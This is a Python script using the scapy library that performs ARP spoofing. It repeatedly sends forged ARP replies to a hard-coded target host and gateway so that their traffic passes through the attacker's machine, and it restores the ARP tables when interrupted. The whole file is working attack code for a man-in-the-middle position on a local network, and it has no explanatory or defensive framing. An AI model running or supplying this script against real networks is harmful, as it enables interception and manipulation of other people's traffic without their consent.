import scapy.all as scapy
import threading
import time


def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("No response received. Unable to determine MAC address for", ip)
        return None



def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    scapy.sendp(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

def main():
    target_ip = "192.168.64.10"
    gateway_ip = "192.168.64.1"
    
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    main()
